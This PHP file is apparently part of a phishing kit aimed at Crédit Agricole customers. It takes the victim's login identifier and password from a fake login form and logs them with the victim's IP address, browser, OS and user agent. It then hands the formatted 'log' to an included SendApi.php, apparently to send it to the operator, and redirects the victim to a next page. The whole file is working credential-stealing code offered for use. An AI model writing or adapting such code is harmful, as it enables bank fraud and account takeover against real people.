<?php

error_reporting(0);
session_start();

include("../detect.php"); 
$useragent = $_SERVER['HTTP_USER_AGENT'];
$brow = getBrowser() ;
$sys = getOs();
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;

$InfoDATE   = date("d-m-Y h:i:sa");	

$identifiant = $_SESSION['identifiant'] = $_POST['identifiant'];
$password = $_SESSION['password'] = $_POST['password'];




$yagmai .= '
[🆔 identifiant ] = '.$_SESSION['identifiant'].'
[🔓 Password ] = '.$_SESSION['password'].'
    [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
';


$yagmail .= '
[+]━━━━━━━━━━━━━【 Log Agricole 】━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━━━【🆔Login】━━━━━━━━━━━━━━━━━━━━[+]
[🆔 identifiant ] = '.$_SESSION['identifiant'].'
[🔓 Password ] = '.$_SESSION['password'].'
[+]=━━━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🔍 FINGERPRINT] = '.$useragent.'
[+]━━━━━━━━━━━━━━【 End Log 】━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【Einstein REZ🤡🖕】━━━━━━━━━━━━━━━[+]
';


include("SendApi.php"); 


$src="../load_auth.php";
header("location:$src");

?>